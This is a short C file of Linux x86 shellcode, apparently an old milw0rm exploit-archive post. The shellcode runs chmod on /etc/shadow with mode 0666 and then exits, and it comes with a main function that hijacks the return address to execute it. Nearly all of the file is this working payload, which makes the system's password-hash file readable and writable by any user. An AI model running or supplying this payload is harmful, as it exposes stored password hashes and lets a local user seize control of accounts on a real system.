/*
 * (linux/x86) chmod("/etc/shadow", 0666) + exit() - 32 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x0f"              // push $0xf
	"\x58"                  // pop %eax
	"\x31\xc9"              // xor %ecx,%ecx
	"\x51"                  // push %ecx
	"\x66\xb9\xb6\x01"      // mov $0x1b6,%cx
	"\x68\x61\x64\x6f\x77"  // push $0x776f6461
	"\x68\x63\x2f\x73\x68"  // push $0x68732f63
	"\x68\x2f\x2f\x65\x74"  // push $0x74652f2f
	"\x89\xe3"              // mov %esp,%ebx
	"\xcd\x80"              // int $0x80
	"\x40"                  // inc %eax
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]